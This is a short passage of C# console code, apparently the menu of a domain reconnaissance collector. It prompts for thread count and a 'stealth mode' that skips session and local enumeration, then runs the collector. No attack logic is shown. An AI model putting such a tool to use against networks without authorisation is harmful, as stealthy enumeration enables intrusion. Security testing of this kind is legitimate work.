            string threadsStr = Console.ReadLine()?.Trim();
            int threads = 10;
            if (!string.IsNullOrEmpty(threadsStr) && int.TryParse(threadsStr, out int t))
                threads = t;

            Console.Write("[?] Stealth mode (skip session/local enum)? (y/n) [n]: ");
            string stealthChoice = Console.ReadLine()?.Trim().ToLower();
            bool stealth = stealthChoice == "y" || stealthChoice == "yes";

            CollectionMethod method = Collector.ParseCollectionMethod(methodStr);

            Console.WriteLine();
            var collector = new Collector(
                methods: method,
                outputDir: string.IsNullOrEmpty(outputDir) ? null : outputDir,
                threads: threads,
                stealth: stealth
            );

            collector.Run();
        }
        #endregion
    }
}
